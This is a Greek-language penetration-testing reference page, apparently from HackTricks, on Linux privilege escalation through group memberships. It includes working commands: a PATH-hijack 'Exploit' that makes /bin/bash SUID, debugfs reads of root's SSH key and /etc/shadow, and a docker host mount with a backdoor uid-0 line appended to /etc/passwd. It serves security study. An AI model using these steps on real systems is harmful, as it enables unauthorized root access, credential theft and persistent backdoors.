# Ενδιαφέρουσες Ομάδες - Linux Privesc

## Ομάδες Sudo/Admin

### **PE - Method 1**

**Μερικές φορές**, η πολιτική **/etc/sudoers** ενός συστήματος (ή ένα αρχείο που περιλαμβάνεται από αυτήν) περιέχει καταχωρίσεις όπως:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι οποιοσδήποτε χρήστης αντιστοιχεί σε οποιαδήποτε από τις δύο καταχωρίσεις μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη της υπόλοιπης πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root μπορείς απλώς να εκτελέσεις**:
```
sudo su
```
### PE - Method 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν το **pkexec είναι SUID binary**, μπορεί να εκτελέσει ένα πρόγραμμα ως άλλος χρήστης μόνο όταν το polkit εξουσιοδοτεί την αιτούμενη ενέργεια· το SUID bit από μόνο του δεν εγγυάται root. Ελέγξτε την εγκατεστημένη policy και την εξουσιοδότηση του session-στόχου αντί να θεωρείτε ότι η συμμετοχή στις ομάδες **sudo** ή **admin** επαρκεί.<sup>[[4]](#references)[[5]](#references)</sup>

Σε distributions που εξακολουθούν να χρησιμοποιούν το παλαιότερο Local Authority backend, ελέγξτε τους group rules με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Τα σχετικά ονόματα ομάδων και οι προεπιλογές διαφέρουν ανά distribution· μια ομάδα είναι χρήσιμη εδώ μόνο αν η τοπική πολιτική την ονομάζει.<sup>[[5]](#references)</sup>

Για να **γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Αν προσπαθήσετε να εκτελέσετε το **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Σε μια συνεδρία SSH χωρίς καταχωρισμένο authentication agent, το `pkexec` μπορεί να αποτύχει με αυτό το σφάλμα, ακόμη και όταν η policy θα επέτρεπε κανονικά την ενέργεια· το polkit τεκμηριώνει το `pkttyagent` ως text authentication agent για συνεδρίες εκτός desktop. Η ακριβής συμπεριφορά εξαρτάται από την έκδοση και τη διανομή, επομένως επαληθεύστε την τοπική policy και τη ρύθμιση του agent. Ένα workaround που έχει αναφερθεί για επηρεαζόμενες εκδόσεις του NixOS χρησιμοποιεί **2 διαφορετικές συνεδρίες SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

Μερικές φορές, μια πολιτική sudoers μπορεί επίσης να περιέχει αυτήν την καταχώριση:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι οποιοσδήποτε χρήστης αντιστοιχεί στην καταχώριση μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη της υπόλοιπης πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root μπορείς απλώς να εκτελέσεις**:
```
sudo su
```
## Shadow Group

Σε συστήματα των οποίων τα permissions το επιτρέπουν, οι χρήστες της ομάδας **shadow** μπορούν να **διαβάσουν** το **/etc/shadow**· επαληθεύστε το πραγματικό mode και τα ACLs στο target:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Λοιπόν, διαβάστε το αρχείο και προσπαθήστε να κάνετε **crack σε κάποια hashes**.

Μια χρήσιμη λεπτομέρεια σχετικά με την κατάσταση κλειδώματος κατά την ανάλυση hashes:
- Οι εγγραφές με `!` ή `*` είναι γενικά μη διαδραστικές για συνδέσεις με κωδικό πρόσβασης.
- `!hash` σημαίνει ότι ο κωδικός πρόσβασης έχει κλειδωθεί· οι υπόλοιποι χαρακτήρες αντιπροσωπεύουν το πεδίο κωδικού πρόσβασης πριν κλειδωθεί.
- Ένα πεδίο που περιέχει `*` δεν είναι έγκυρο hash `crypt(3)` και αποτρέπει τη σύνδεση με κωδικό πρόσβασης UNIX· μην συμπεραίνετε από αυτό αν είχε οριστεί προηγουμένως κωδικός πρόσβασης.
Αυτό είναι χρήσιμο για την ταξινόμηση λογαριασμών, ακόμη και όταν η άμεση σύνδεση είναι αποκλεισμένη.<sup>[[6]](#references)</sup>

## Ομάδα Staff

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται δικαιώματα root (σημειώστε ότι τα εκτελέσιμα στο `/usr/local/bin` περιλαμβάνονται στη μεταβλητή PATH κάθε χρήστη και μπορούν να "αντικαταστήσουν" τα εκτελέσιμα στα `/bin` και `/usr/bin` με το ίδιο όνομα). Συγκρίνετέ την με την ομάδα "adm", η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια.<sup>[[2]](#references)[[7]](#references)</sup>

Σε διαμορφώσεις Debian όπου το `/usr/local/bin` προηγείται του `/usr/bin` στο `PATH` (όπως στα παρακάτω παραδείγματα), μια εντολή χωρίς πλήρη διαδρομή επιλύεται πρώτα στην έκδοση του `/usr/local/bin`· επιβεβαιώστε το ενεργό `PATH` στο target.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Εάν μια προνομιούχα διεργασία επιλύει μια εντολή χωρίς πλήρη διαδρομή μέσω ενός εγγράψιμου `/usr/local/bin`, η αντικατάσταση αυτής της εντολής μπορεί να εκτελεστεί με τα δικαιώματα της διεργασίας· επιβεβαιώστε την πραγματική διαδρομή και το trigger πριν από τη δοκιμή.

Σε συστήματα Ubuntu, το `pam_motd` εκτελεί executable scripts μέσω του `run-parts --lsbsysinit` ως root κατά τη σύνδεση· οι cron jobs ενδέχεται επίσης να χρησιμοποιούν το `run-parts`, αλλά αυτό εξαρτάται από τη distribution και τη ρύθμιση παραμέτρων.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Σε μια νέα σύνδεση SSH, το `pspy` μπορεί να βοηθήσει στην επιβεβαίωση του αν αυτή η διαδρομή καλείται πράγματι στο target· μπορεί να παρακολουθεί τις γραμμές εντολών των διεργασιών χωρίς δικαιώματα root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Ομάδα disk

Η συμμετοχή στην ομάδα **disk** μπορεί να παρέχει άμεση πρόσβαση σε block devices και συχνά είναι **σχεδόν ισοδύναμη με root access**· το Debian την περιγράφει ως σε μεγάλο βαθμό ισοδύναμη με root, αλλά πρέπει να επαληθεύετε τα πραγματικά δικαιώματα των συσκευών και τη διάταξη αποθήκευσης στο target.<sup>[[7]](#references)</sup>

Συνήθεις διαδρομές συσκευών περιλαμβάνουν τις `/dev/sd*`, αλλά τα NVMe και άλλες διατάξεις αποθήκευσης χρησιμοποιούν διαφορετικές ονομασίες.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Το `debugfs` λειτουργεί σε filesystems ext2/ext3/ext4· οι διαδρομές όπως `/root` και `/etc/shadow` παραπάνω είναι αρχεία μέσα στο ανοιγμένο filesystem, ενώ το δεύτερο όρισμα της `dump` είναι μια διαδρομή εξόδου στο native filesystem.<sup>[[8]](#references)</sup> Για παράδειγμα, αυτό εξάγει το `/tmp/asd1.txt` από το ανοιγμένο filesystem στο `/tmp/asd2.txt` του native filesystem:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Η επιλογή `-w` ανοίγει το σύστημα αρχείων με δικαιώματα ανάγνωσης-εγγραφής, ενώ η εντολή `write` αντιγράφει ένα native αρχείο στο ανοιγμένο σύστημα αρχείων. Αποφύγετε τη χρήση της σε προσαρτημένο live σύστημα αρχείων, επειδή οι άμεσες τροποποιήσεις μπορούν να καταστρέψουν το σύστημα αρχείων· όταν είναι δυνατόν, εργαστείτε από ένα offline image.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Ομάδα Video

Χρησιμοποιώντας την εντολή `w`, μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανιστεί μια έξοδος όπως η ακόλουθη.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Η καταχώριση **tty1** προσδιορίζει την πρώτη εικονική κονσόλα Linux· από μόνη της δεν αποδεικνύει ότι υπάρχει φυσικά κάποιος στο μηχάνημα, ειδικά σε containers ή άλλα περιβάλλοντα.<sup>[[21]](#references)</sup>

Σε συστήματα που εκθέτουν μια αναγνώσιμη συσκευή framebuffer, η συμμετοχή στην ομάδα **video** ενδέχεται να παρέχει πρόσβαση σε αυτήν τη συσκευή. Η διεπαφή framebuffer του Linux τεκμηριώνει το `/dev/fb0` ως αναγνώσιμη συσκευή μνήμης που μπορεί να αντιγραφεί για τη λήψη στιγμιότυπου οθόνης· η διαδρομή `/sys/class/graphics/fb0/virtual_size` είναι διαθέσιμη μόνο όπου υπάρχει αυτό το χαρακτηριστικό sysfs του fbdev, επομένως ελέγξτε πρώτα το target.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Αν η εγκατεστημένη έκδοση του **GIMP** παρέχει importer raw δεδομένων, ανοίξτε το **`screen.raw`** με αυτόν τον importer· η υποστήριξη και τα διαθέσιμα στοιχεία ελέγχου διαφέρουν ανάλογα με την έκδοση και το plug-in.<sup>[[22]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Για να ανοίξετε την raw εικόνα, μπορείτε να χρησιμοποιήσετε το GIMP, να επιλέξετε το αρχείο screen.raw και ως τύπο αρχείου να επιλέξετε Raw image data](<../../../images/image (463).png>)

Ορίστε το Width και το Height της εικόνας ώστε να αντιστοιχούν στη γεωμετρία του framebuffer· δοκιμάστε τις διαθέσιμες μορφές pixel/Image Types μέχρι η έξοδος να είναι ευανάγνωστη.<sup>[[9]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Στη συνέχεια τροποποιήστε τα Width και Height ώστε να αντιστοιχούν σε αυτά που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικά Image Types (και επιλέξτε αυτό που εμφανίζει καλύτερα την οθόνη)](<../../../images/image (317).png>)

## Ομάδα root

Η συμμετοχή στην ομάδα **root** δεν παρέχει το UID του root, αλλά αρχεία με δυνατότητα εγγραφής από την ομάδα, τα οποία ανήκουν στον `root`, μπορεί να εξακολουθούν να είναι ενδιαφέροντα όταν privileged services ή libraries τα χρησιμοποιούν. Επαληθεύστε τα πραγματικά permissions του αρχείου και τον τρόπο χρήσης του, προτού το θεωρήσετε μονοπάτι κλιμάκωσης προνομίων.

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Ομάδα Docker

Η συμμετοχή στην ομάδα `docker` παρέχει πρόσβαση επιπέδου root στο Docker daemon σε τυπικές εγκαταστάσεις rootful. Επειδή τα bind mounts είναι από προεπιλογή read-write, ένας χρήστης που μπορεί να ελέγξει αυτό το daemon μπορεί να κάνει mount το `/` του host σε ένα container και να τροποποιήσει αρχεία του host· αυτό ουσιαστικά παρέχει δικαιώματα root στον host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Τέλος, αν δεν σας αρέσει καμία από τις παραπάνω προτάσεις ή δεν λειτουργούν για κάποιον λόγο (docker api firewall;), μπορείτε πάντα να δοκιμάσετε να **εκτελέσετε ένα privileged container και να κάνετε escape από αυτό**, όπως εξηγείται εδώ:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Αν έχετε δικαιώματα εγγραφής στο docker socket, διαβάστε [**αυτό το post σχετικά με το πώς να κάνετε privilege escalation κάνοντας abuse του docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Συνήθως τα **μέλη** του group **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία log** που βρίσκονται μέσα στο _/var/log/_.\
Επομένως, αν έχετε κάνει compromise σε έναν user που ανήκει σε αυτό το group, θα πρέπει οπωσδήποτε να **ελέγξετε τα logs**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Αυτά τα groups έχουν σημασίες που εξαρτώνται από την υπηρεσία και τη διανομή. Το Debian τεκμηριώνει το `backup` για delegated backup/restore, το `lp` για printer daemons και το `mail` για το `/var/mail`, επομένως ελέγξτε τα τοπικά permissions προτού αντιμετωπίσετε τη συμμετοχή σε αυτά ως privilege path.<sup>[[7]](#references)</sup>

Συχνά αποτελούν vectors για **credential-discovery** και όχι άμεσα root vectors:
- **backup**: μπορεί να εκθέτει archives με configs, keys, DB dumps ή tokens.
- **operator**: operational access που εξαρτάται από την πλατφόρμα και μπορεί να κάνει leak ευαίσθητα runtime data.
- **lp**: τα print queues/spools μπορεί να περιέχουν περιεχόμενα εγγράφων.
- **mail**: τα mail spools μπορεί να εκθέτουν reset links, OTPs και εσωτερικά credentials.

Αντιμετωπίστε τη συμμετοχή σε αυτά τα groups ως εύρημα έκθεσης δεδομένων υψηλής αξίας και κάντε pivot μέσω επαναχρησιμοποίησης password/token.

## Auth group

Στο OpenBSD, όταν έχει ρυθμιστεί το S/Key, το `/etc/skey` ανήκει στο `root:auth` και η πρόσβαση στα records του απαιτεί το group `auth`. Τα YubiKey records αποθηκεύονται στο `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Μια ευάλωτη ρύθμιση του OpenBSD 6.6 με ενεργοποιημένο S/Key ή YubiKey επέτρεπε σε local users με `auth` privileges να γίνουν root. Η Qualys τεκμηριώνει την προϋπόθεση και την exploit chain, ενώ το συνδεδεμένο PoC την υλοποιεί.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Έλεγχος ταυτότητας pkexec/pkttyagent χωρίς GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Reference Manual του polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Reference Manual του polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Εγχειρίδιο ασφάλειας του Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — σελίδα εγχειριδίου του Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Η συσκευή Frame Buffer — τεκμηρίωση του Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — snooping διεργασιών Linux χωρίς privileges](https://github.com/DominicBreuker/pspy)
- [13] [Ασφάλεια του Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Διαχείριση του Docker ως non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Εκτέλεση containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Ευπάθειες authentication στο OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (έκδοση 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import και Export — τεκμηρίωση του GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
